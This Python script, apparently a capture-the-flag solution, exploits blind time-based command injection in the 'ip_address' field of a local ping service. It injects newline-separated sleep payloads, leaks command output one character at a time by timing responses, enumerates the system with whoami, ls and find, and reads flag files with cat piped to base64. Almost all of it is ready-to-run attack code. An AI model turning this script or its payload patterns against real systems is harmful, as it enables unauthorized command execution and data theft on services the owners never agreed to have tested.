import requests
import time
import base64
import string

# Configuration
TARGET_URL = "http://127.0.0.1:32817/ping"
TIMEOUT_THRESHOLD = 4  # seconds - payloads should take 5+ seconds if successful
CHARSET = string.ascii_letters + string.digits + string.punctuation + string.whitespace

def send_payload(payload):
    """Send payload to target and return response time"""
    try:
        start_time = time.time()
        response = requests.post(
            TARGET_URL,
            data={"ip_address": payload},
            timeout=10
        )
        end_time = time.time()
        return end_time - start_time, response.status_code
    except requests.RequestException as e:
        print(f"[-] Request error: {e}")
        return 0, 0

def test_command_injection():
    """Test for command injection using sleep payload"""
    print("[+] Testing for blind command injection (sleep-based)...")
    
    # Test payload format: f"127.0.0.1%0asleep 5%0a"
    test_payload = "127.0.0.1%0asleep 5%0a"
    
    print(f"[+] Sending payload: {test_payload}")
    response_time, status_code = send_payload(test_payload)
    
    print(f"[+] Response time: {response_time:.2f}s | Status: {status_code}")
    
    if response_time >= TIMEOUT_THRESHOLD:
        print("[+] Command injection confirmed! Response time indicates command execution.")
        return True
    else:
        print("[-] Command injection not detected. Response time too fast.")
        return False

def extract_output_char_by_char(command, max_length=100):
    """
    Extract command output character by character using blind injection
    Uses base64 encoding to handle special characters safely
    """
    print(f"\n[+] Extracting output for command: {command}")
    
    extracted = ""
    
    for position in range(1, max_length + 1):
        char_found = False
        
        for char in CHARSET:
            # Base64 encode the command output for safe extraction
            b64_char = base64.b64encode(char.encode()).decode()
            
            # Payload structure:
            # 1. Valid IP
            # 2. Command separator (%0a)
            # 3. Extract char at position, base64 encode
            # 4. Compare with target char
            # 5. If match, sleep 5s
            
            payload = f"127.0.0.1%0a"
            payload += f"test=$(echo $({command} | head -1 | cut -c{position}-{position} | base64))%0a"
            payload += f"if [ \"$test\" = \"{b64_char}\" ]; then sleep 5; fi%0a"
            
            response_time, _ = send_payload(payload)
            
            if response_time >= TIMEOUT_THRESHOLD:
                extracted += char
                print(f"[+] Character {position}: '{char}' (b64: {b64_char})")
                char_found = True
                break
        
        if not char_found:
            # No character found at this position, likely end of output
            break
    
    # Decode any base64 in the extracted string if needed
    print(f"[+] Raw extracted data: {repr(extracted)}")
    
    try:
        # If it looks like base64, try to decode
        if len(extracted) > 10 and extracted.isalnum():
            decoded = base64.b64decode(extracted).decode('utf-8', errors='ignore')
            print(f"[+] Decoded output: {decoded}")
            return decoded
    except:
        pass
    
    return extracted

def enumerate_system():
    """Enumerate system using command injection"""
    results = {}
    
    commands_to_test = [
        "whoami",
        "pwd",
        "ls -la /",
        "find / -name '*flag*' 2>/dev/null"
    ]
    
    print("\n" + "="*60)
    print("SYSTEM ENUMERATION")
    print("="*60)
    
    for cmd in commands_to_test:
        print(f"\n[+] Executing: {cmd}")
        
        # Use simpler extraction for basic commands
        if cmd == "whoami" or cmd == "pwd":
            # These should have short output
            output = extract_output_char_by_char(cmd, max_length=50)
        else:
            # These might have longer output
            output = extract_output_char_by_char(cmd, max_length=200)
        
        results[cmd] = output
        print(f"[+] Result: {cmd} = {output[:100]}{'...' if len(output) > 100 else ''}")
    
    return results

def extract_flag_content(flag_path):
    """Extract contents of a flag file"""
    print(f"\n[+] Attempting to extract flag from: {flag_path}")
    
    # Use cat to read the file and base64 encode for safe extraction
    command = f"cat {flag_path} | base64 -w 0"
    
    # Extract base64 encoded content
    b64_output = extract_output_char_by_char(command, max_length=300)
    
    try:
        # Decode base64 to get actual flag content
        if b64_output:
            decoded = base64.b64decode(b64_output).decode('utf-8', errors='ignore')
            print(f"[+] Flag content: {decoded}")
            return decoded
    except Exception as e:
        print(f"[-] Error decoding flag: {e}")
        return None
    
    return None

def main():
    """Main execution"""
    print("="*60)
    print("BLIND COMMAND INJECTION ENUMERATION")
    print(f"Target: {TARGET_URL}")
    print("="*60)
    
    # Step 1: Test for command injection
    if not test_command_injection():
        print("[-] Command injection not detected. Stopping.")
        return
    
    print("\n" + "="*60)
    print("INJECTION CONFIRMED - PROCEEDING WITH ENUMERATION")
    print("="*60)
    
    # Step 2: Enumerate system
    results = enumerate_system()
    
    print("\n" + "="*60)
    print("ENUMERATION RESULTS SUMMARY")
    print("="*60)
    
    for cmd, output in results.items():
        print(f"\n[+] {cmd}:")
        print(f"    {output[:150]}{'...' if len(output) > 150 else ''}")
    
    # Step 3: Check for flag files and extract them
    print("\n" + "="*60)
    print("FLAG FILE HUNT")
    print("="*60)
    
    find_output = results.get("find / -name '*flag*' 2>/dev/null", "")
    
    if find_output and "flag" in find_output.lower():
        print(f"[+] Flag files found: {find_output}")
        
        # Try to parse flag paths (might be multiple)
        flag_paths = []
        for line in find_output.split('\n'):
            line = line.strip()
            if line and 'flag' in line.lower():
                flag_paths.append(line)
        
        for flag_path in flag_paths:
            print(f"\n[+] Extracting flag from: {flag_path}")
            flag_content = extract_flag_content(flag_path)
            
            if flag_content:
                print(f"[!] FLAG DISCOVERED: {flag_content[:100]}...")
                
                # Look for FLAG{ pattern
                if "FLAG{" in flag_content:
                    start = flag_content.find("FLAG{")
                    end = flag_content.find("}", start) + 1
                    if start != -1 and end != -1:
                        flag = flag_content[start:end]
                        print(f"[!] EXTRACTED FLAG: {flag}")
                        return flag
    else:
        print("[-] No flag files discovered")
    
    print("\n[+] Enumeration complete")
    return None

if __name__ == "__main__":
    main()

